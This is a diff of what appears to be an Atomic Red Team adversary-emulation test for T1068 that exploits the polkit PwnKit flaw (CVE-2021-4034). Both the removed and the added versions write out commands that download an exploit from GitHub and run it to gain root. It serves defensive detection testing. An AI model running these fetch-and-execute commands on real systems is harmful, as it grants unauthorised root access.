@@ -1,18 +1,23 @@
+---
 attack_technique: T1068
 display_name: Exploitation for Privilege Escalation
 atomic_tests:
-- name: PwnKit vuln privilege escalation
-  auto_generated_guid: c1ab0c34-8a8e-43ed-9518-b15724fbc1e1
-  description: |
-    Exploit vulnerabity CVE_2021_4034 in polkit to get local privilege escalation.
-  supported_platforms:
-  - linux
-  input_arguments:
-    exploit_url:
-      description: Path to download ready-made exploit
-      type: url
-      default: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
-  executor:
-    name: sh
-    command: |-
-      cd /tmp && /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+  - name: PwnKit vuln privilege escalation
+    auto_generated_guid: c1ab0c34-8a8e-43ed-9518-b15724fbc1e1
+    description: |
+      Exploit vulnerabity CVE_2021_4034 in polkit to get local privilege escalation.
+    supported_platforms:
+      - linux
+    input_arguments:
+      exploit_url:
+        description: Path to download ready-made exploit
+        type: url
+        default: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
+    executor:
+      name: sh
+      command: |-
+        cd /tmp
+        curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
+        chmod +x ./PwnKit || exit
+        (sleep 1 && rm ./PwnKit & )
+        ./PwnKit
